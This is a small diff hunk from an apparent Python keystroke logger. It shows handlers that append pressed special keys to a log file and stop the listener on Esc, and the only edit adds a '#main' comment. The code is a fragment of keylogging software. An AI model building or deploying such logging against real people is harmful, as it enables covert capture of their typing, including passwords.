@@ -11,7 +11,7 @@ def on_press(key):
         # This is for special keys (e.g., space, enter, etc.)
         with open(log_file, "a") as f:
             f.write(f" {str(key)} ")
-
+#main
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop listener
